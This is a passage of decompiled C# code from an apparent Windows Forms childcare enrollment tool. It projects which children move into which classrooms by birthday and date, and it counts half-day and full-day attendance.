							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								flag = false;
							}
							break;
						case "Fireflies":
							if ((Operators.CompareString(item16.strNextSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								flag = false;
							}
							break;
						case "Butterflies":
							if ((Operators.CompareString(item16.strNextSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								flag = false;
							}
							break;
						case "Turtles":
							if ((Operators.CompareString(item16.strNextSpecificClassroom, strSpecificClassroom, false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0) & (Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) == 0) & (Operators.CompareString(strSpecificClassroom, "", false) != 0))
							{
								flag = false;
							}
							else if ((Operators.CompareString(item16.strNextSpecificClassroom, "", false) != 0) & (Operators.CompareString(strSpecificClassroom, "", false) == 0))
							{
								flag = false;
							}
							break;
						}
						if (flag)
						{
							if (Operators.CompareString(item16.strStartDate, "", false) != 0)
							{
								bolStartDateReady = DateCheck(item16.strStartDate, "", "", bolPredictionOn: false);
							}
							if (Operators.CompareString(item16.strEndDate, "", false) != 0)
							{
								bolEndDateReady = DateCheck(item16.strEndDate, "", "", bolPredictionOn: false);
							}
							if ((bolStartDateReady | (Operators.CompareString(item16.strStartDate, "", false) == 0)) && (!bolEndDateReady | (Operators.CompareString(item16.strEndDate, "", false) == 0)) && DateCheck(item16.strBirthday, text, item16.strCurrentClassroom, bolPredictionOn: false))
							{
								dgvProjection.get_Rows().Add(new object[9]
								{
									item16.strLastName + ", " + item16.strFirstName,
									"FLAG",
									item16.strBirthday,
									item16.intAge,
									item16.strMonday,
									item16.strTuesday,
									item16.strWednesday,
									item16.strThursday,
									item16.strFriday
								});
								dgvProjection.get_Rows().get_Item(inc).get_DefaultCellStyle()
									.set_BackColor(Color.MediumPurple);
								inc++;
								lstUnique.get_Items().Add((object)item16.intUnique);
							}
						}
					}
					if (bolExtraBlank & bolNeeded)
					{
						dgvProjection.get_Rows().Add();
						inc++;
						lstUnique.get_Items().Add((object)" ");
					}
				}
				while (num != 0);
			}
			if (bolPrediction)
			{
				return;
			}
			bolNeeded = false;
			foreach (Child item17 in Child.lstChild)
			{
				if (Operators.CompareString(item17.strCurrentClassroom, text, false) == 0)
				{
					if (Operators.CompareString(item17.strStartDate, "", false) != 0)
					{
						bolStartDateReady = DateCheck(item17.strStartDate, "", "", bolPredictionOn: false);
					}
					if (Operators.CompareString(item17.strEndDate, "", false) != 0)
					{
						bolEndDateReady = DateCheck(item17.strEndDate, "", "", bolPredictionOn: false);
					}
					if ((!bolStartDateReady & (Operators.CompareString(item17.strStartDate, "", false) != 0)) && (!bolEndDateReady | (Operators.CompareString(item17.strEndDate, "", false) == 0)))
					{
						bolNeeded = true;
					}
				}
			}
			if (!bolNeeded)
			{
				return;
			}
			dgvProjection.get_Rows().Add(new object[1] { "Not Yet Started" });
			dgvProjection.get_Rows().get_Item(inc).get_Cells()
				.get_Item(0)
				.get_Style()
				.set_Font(new Font("Calibri", 15f, (FontStyle)2));
			dgvProjection.get_Rows().get_Item(inc).set_Height(30);
			inc++;
			lstUnique.get_Items().Add((object)" ");
			foreach (Child item18 in Child.lstChild)
			{
				if (Operators.CompareString(item18.strCurrentClassroom, text, false) != 0)
				{
					continue;
				}
				if (Operators.CompareString(item18.strStartDate, "", false) != 0)
				{
					bolStartDateReady = DateCheck(item18.strStartDate, "", "", bolPredictionOn: false);
				}
				if (Operators.CompareString(item18.strEndDate, "", false) != 0)
				{
					bolEndDateReady = DateCheck(item18.strEndDate, "", "", bolPredictionOn: false);
				}
				if (!(!bolStartDateReady & (Operators.CompareString(item18.strStartDate, "", false) != 0)) || !(!bolEndDateReady | (Operators.CompareString(item18.strEndDate, "", false) == 0)))
				{
					continue;
				}
				if (Operators.CompareString(item18.strFlagDate, "None", false) != 0)
				{
					bolFlag = DateCheck(item18.strFlagDate, "", "", bolPredictionOn: false);
					if (bolFlag)
					{
						strFlag = "FLAG";
					}
					else
					{
						strFlag = "";
					}
				}
				else
				{
					strFlag = "";
				}
				dgvProjection.get_Rows().Add(new object[9]
				{
					item18.strLastName + ", " + item18.strFirstName,
					strFlag,
					item18.strBirthday,
					item18.intAge,
					item18.strMonday,
					item18.strTuesday,
					item18.strWednesday,
					item18.strThursday,
					item18.strFriday
				});
				dgvProjection.get_Rows().get_Item(inc).get_DefaultCellStyle()
					.set_BackColor(Color.LightBlue);
				inc++;
				lstUnique.get_Items().Add((object)item18.intUnique);
			}
			dgvProjection.get_Rows().Add();
			inc++;
			lstUnique.get_Items().Add((object)" ");
		}
	}

	private void ResetNumbers()
	{
		intMondayAM = 0;
		intTuesdayAM = 0;
		intWednesdayAM = 0;
		intThursdayAM = 0;
		intFridayAM = 0;
		intMondayPM = 0;
		intTuesdayPM = 0;
		intWednesdayPM = 0;
		intThursdayPM = 0;
		intFridayPM = 0;
	}

	private int GetLimit(string strClassroom, string strSpecificClassroom)
	{
		switch (strClassroom)
		{
		case "Tree Frogs":
			return 20;
		case "Dragonflies/Lions":
			if (Operators.CompareString(strSpecificClassroom, "Dragonflies", false) != 0)
			{
				if (Operators.CompareString(strSpecificClassroom, "Lions", false) == 0)
				{
					return 10;
				}
				break;
			}
			return 20;
		case "Fireflies/Ladybugs":
			if (Operators.CompareString(strSpecificClassroom, "Fireflies", false) != 0)
			{
				if (Operators.CompareString(strSpecificClassroom, "Ladybugs", false) == 0)
				{
					return 8;
				}
				break;
			}
			return 8;
		case "Turtles/Butterflies":
			if (Operators.CompareString(strSpecificClassroom, "Turtles", false) != 0)
			{
				if (Operators.CompareString(strSpecificClassroom, "Butterflies", false) == 0)
				{
					return 8;
				}
				break;
			}
			return 8;
		case "Caterpillars":
			return 12;
		}
		int result = default(int);
		return result;
	}

	private void DaysOfWeekCount(Child oChild)
	{
		checked
		{
			switch (oChild.strMonday)
			{
			case "Half PM":
				intMondayPM++;
				break;
			case "Half AM":
				intMondayAM++;
				break;
			case "Full Day":
				intMondayAM++;
				intMondayPM++;
				break;
			}
			switch (oChild.strTuesday)
			{
			case "Half PM":
				intTuesdayPM++;
				break;
			case "Half AM":
				intTuesdayAM++;
				break;
			case "Full Day":
				intTuesdayAM++;
				intTuesdayPM++;
				break;
			}
			switch (oChild.strWednesday)
			{
			case "Half PM":
				intWednesdayPM++;
				break;
			case "Half AM":
				intWednesdayAM++;
				break;
			case "Full Day":
				intWednesdayAM++;
				intWednesdayPM++;
				break;
			}
			switch (oChild.strThursday)
			{
			case "Half PM":
				intThursdayPM++;
				break;
			case "Half AM":
				intThursdayAM++;
				break;
			case "Full Day":
				intThursdayAM++;
				intThursdayPM++;
				break;
			}
			switch (oChild.strFriday)
			{
			case "Half PM":
				intFridayPM++;
				break;
			case "Half AM":
				intFridayAM++;
				break;
			case "Full Day":
				intFridayAM++;
				intFridayPM++;
				break;
			}
		}
	}

	public bool DateCheck(string strDate, string strClassroom, string strCurrentClassroom, bool bolPredictionOn)
	{
		int num = Conversions.ToInteger(strDate.Substring(6, 4));
		int num2 = Conversions.ToInteger(strDate.Substring(0, 2));
		int num3 = Conversions.ToInteger(strDate.Substring(3, 2));
		int num4 = intYearSequence;
		int num5 = intMonthSequence;
		int num6 = intDaySequence;
		checked
		{
			switch (strClassroom)
			{
			case null:
			case "":
				num += 0;
				break;
			case "Tree Frogs":
				num += 4;
				break;
			case "Dragonflies/Lions":
				num += 3;
				break;
			case "Fireflies/Ladybugs":
				num += 2;
				break;
			case "Turtles/Butterflies":
				num++;
				break;
			}
			int num7 = num4 - num;
			bool flag;
			if (num7 > 0)
			{
				flag = true;
			}
			else if (num7 < 0)
			{
				flag = false;
			}
			else
			{
				int num8 = num5 - num2;
				if (num8 > 0)
				{
					flag = true;
				}
				else if (num8 < 0)
				{
					flag = false;
				}
				else
				{
					int num9 = num6 - num3;
					flag = num9 > 0 || num9 >= 0;
				}
			}
			if (!bolPredictionOn)
			{
				switch (strCurrentClassroom)
				{
				case "Kindergarten":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) | (Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0) | (Operators.CompareString(strClassroom, "Dragonflies/Lions", false) == 0) | (Operators.CompareString(strClassroom, "Tree Frogs", false) == 0))
					{
						flag = false;
					}
					break;
				case "Tree Frogs":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) | (Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0) | (Operators.CompareString(strClassroom, "Dragonflies/Lions", false) == 0) | (Operators.CompareString(strClassroom, "Tree Frogs", false) == 0))
					{
						flag = false;
					}
					break;
				case "Dragonflies/Lions":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) | (Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0) | (Operators.CompareString(strClassroom, "Dragonflies/Lions", false) == 0))
					{
						flag = false;
					}
					break;
				case "Fireflies/Ladybugs":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) | (Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0))
					{
						flag = false;
					}
					break;
				case "Turtles/Butterflies":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0))
					{
						flag = false;
					}
					break;
				case "Caterpillars":
					if (Operators.CompareString(strClassroom, "Caterpillars", false) == 0)
					{
						flag = false;
					}
					break;
				}
			}
			if (Operators.CompareString(strClassroom, "Kindergarten", false) == 0)
			{
				flag = false;
			}
			if (bolPredictionOn)
			{
				switch (strCurrentClassroom)
				{
				case "Kindergarten":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) | (Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0) | (Operators.CompareString(strClassroom, "Dragonflies/Lions", false) == 0) | (Operators.CompareString(strClassroom, "Tree Frogs", false) == 0) | (Operators.CompareString(strClassroom, "Kindergarten", false) == 0))
					{
						flag = false;
					}
					break;
				case "Tree Frogs":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) | (Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0) | (Operators.CompareString(strClassroom, "Dragonflies/Lions", false) == 0))
					{
						flag = false;
					}
					break;
				case "Dragonflies/Lions":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) | (Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0))
					{
						flag = false;
					}
					break;
				case "Fireflies/Ladybugs":
					if ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) | (Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0))
					{
						flag = false;
					}
					break;
				case "Turtles/Butterflies":
					if (Operators.CompareString(strClassroom, "Caterpillars", false) == 0)
					{
						flag = false;
					}
					break;
				}
			}
			return flag = flag;
		}
	}

	private bool CheckNextClassroom(string strBirthday, string strCurrentClassroom, string strClassroom)
	{
		int num = Conversions.ToInteger(strBirthday.Substring(6, 4));
		int num2 = Conversions.ToInteger(strBirthday.Substring(0, 2));
		int num3 = Conversions.ToInteger(strBirthday.Substring(3, 2));
		int num4 = intYearSequence;
		int num5 = intMonthSequence;
		int num6 = intDaySequence;
		checked
		{
			int num7 = default(int);
			bool flag;
			do
			{
				num++;
				num7++;
				int num8 = num4 - num;
				if (num8 <= 0)
				{
					if (num8 < 0)
					{
						flag = false;
						continue;
					}
					int num9 = num5 - num2;
					if (num9 > 0)
					{
						flag = true;
						continue;
					}
					if (num9 < 0)
					{
						flag = false;
						continue;
					}
					int num10 = num6 - num3;
					flag = num10 > 0 || num10 >= 0;
				}
				else
				{
					flag = true;
				}
			}
			while (flag);
			switch (num7)
			{
			case 1:
				flag = ((Operators.CompareString(strClassroom, "Caterpillars", false) == 0) ? true : false);
				break;
			case 2:
				flag = ((Operators.CompareString(strClassroom, "Turtles/Butterflies", false) == 0) ? true : false);
				break;
			case 3:
				flag = ((Operators.CompareString(strClassroom, "Fireflies/Ladybugs", false) == 0) ? true : false);
				break;
			case 4:
				flag = ((Operators.CompareString(strClassroom, "Dragonflies/Lions", false) == 0) ? true : false);
				break;
			case 5:
				flag = ((Operators.CompareString(strClassroom, "Tree Frogs", false) == 0) ? true : false);
				break;
			}
			return flag = flag;
		}
	}

	private void DataGridFormatting()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		dgvProjection.ClearSelection();
		dgvProjection.set_Font(new Font("Calibri", 14f));
		DataGridViewColumn val = dgvProjection.get_Columns().get_Item(0);
		val.set_Width(300);
		DataGridViewColumn val2 = dgvProjection.get_Columns().get_Item(1);
		val2.set_Width(60);
		DataGridViewColumn val3 = dgvProjection.get_Columns().get_Item(2);
		val3.set_Width(120);
		DataGridViewColumn val4 = dgvProjection.get_Columns().get_Item(3);
		val4.set_Width(55);
	}

	private void btnUpClass_Click(object sender, EventArgs e)
	{
		lblClass.set_Text(GetClassroom("Up"));
		Load_Projection();
		((Control)dgvProjection).Focus();
		((Form)this).set_Text(lblClass.get_Text() + " - " + lblMonthYear.get_Text());
		((Control)lblClass).set_Left(checked((int)Math.Round((double)((Control)this).get_Width() / 2.0 - (double)((Control)lblClass).get_Width() / 2.0)));
	}

	private void btnDownClass_Click(object sender, EventArgs e)
	{
		lblClass.set_Text(GetClassroom("Down"));
		Load_Projection();
		((Control)dgvProjection).Focus();
		((Form)this).set_Text(lblClass.get_Text() + " - " + lblMonthYear.get_Text());
		((Control)lblClass).set_Left(checked((int)Math.Round((double)((Control)this).get_Width() / 2.0 - (double)((Control)lblClass).get_Width() / 2.0)));
	}

	private string GetClassroom(string btn)
	{
		string result = "";
		if (Operators.CompareString(btn, "Up", false) != 0)
		{
			if (Operators.CompareString(btn, "Down", false) == 0)
			{
				switch (lblClass.get_Text())
				{
				case "Kindergarten":
					result = "Caterpillars";
					break;
				case "Tree Frogs":
					result = "Kindergarten";
					break;
				case "Dragonflies/Lions":
					result = "Tree Frogs";
					break;
				case "Fireflies/Ladybugs":
					result = "Dragonflies/Lions";
					break;
				case "Turtles/Butterflies":
					result = "Fireflies/Ladybugs";
					break;
				case "Caterpillars":
					result = "Turtles/Butterflies";
					break;
				}
			}
		}
		else
		{
			switch (lblClass.get_Text())
			{
			case "Turtles/Butterflies":
				result = "Caterpillars";
				break;
			case "Fireflies/Ladybugs":
				result = "Turtles/Butterflies";
				break;
			case "Dragonflies/Lions":
				result = "Fireflies/Ladybugs";
				break;
			case "Tree Frogs":
				result = "Dragonflies/Lions";
				break;
			case "Kindergarten":
				result = "Tree Frogs";
				break;
			case "Caterpillars":
				result = "Kindergarten";
				break;
			}
		}
		return result;
	}

	private void btnNextMonth_Click(object sender, EventArgs e)
	{
		checked
		{
			intMonthSequence++;
			if (intMonthSequence > 12)
			{
				intMonthSequence = 1;
				intYearSequence++;
			}
			string correspondingMonth = GetCorrespondingMonth(intMonthSequence);
			lblMonthYear.set_Text(correspondingMonth + " " + intYearSequence);
			((Control)lblMonthYear).set_Left(((Control)this).get_Width() - (((Control)lblMonthYear).get_Width() + 10));
			((Form)this).set_Text(lblClass.get_Text() + " - " + lblMonthYear.get_Text());
			Load_Projection();
			((Control)dgvProjection).Focus();
		}
	}

	private void btnPreviousMonth_Click(object sender, EventArgs e)
	{
		checked
		{
			intMonthSequence--;
			if (intMonthSequence < 1)
			{
				intMonthSequence = 12;
				intYearSequence--;
			}
			string correspondingMonth = GetCorrespondingMonth(intMonthSequence);
			lblMonthYear.set_Text(correspondingMonth + " " + intYearSequence);
			((Control)lblMonthYear).set_Left(((Control)this).get_Width() - (((Control)lblMonthYear).get_Width() + 10));
			((Form)this).set_Text(lblClass.get_Text() + " - " + lblMonthYear.get_Text());
			Load_Projection();
			((Control)dgvProjection).Focus();
		}
	}

	private void btnTogglePrediction_Click(object sender, EventArgs e)
	{
		if (!bolPrediction)
		{
			bolPrediction = true;
			((ButtonBase)btnTogglePrediction).set_Text("Turn Prediction Off");
			lblPrediction.set_Text("Prediction = On");
		}
		else
		{
			bolPrediction = false;
			((ButtonBase)btnTogglePrediction).set_Text("Turn Prediction On");
			lblPrediction.set_Text("Prediction = Off");
		}
		Load_Projection();
		((Control)dgvProjection).Focus();
	}

	private void dgvProjection_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
	{
		try
		{
			int index = ((DataGridViewBand)dgvProjection.get_CurrentRow()).get_Index();
			CheckUnique(index);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CheckUnique(int intRowNumber)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		int num = Conversions.ToInteger(lstUnique.get_Items().get_Item(intRowNumber));
		Edit edit = new Edit();
		edit.lblUnique.set_Text(num.ToString());
		((Form)edit).ShowDialog();
	}

	private void btnMainMenu_Click(object sender, EventArgs e)
	{
		Main_Menu main_Menu = new Main_Menu();
		((Control)main_Menu).Show();
		((Form)this).Close();
	}
}
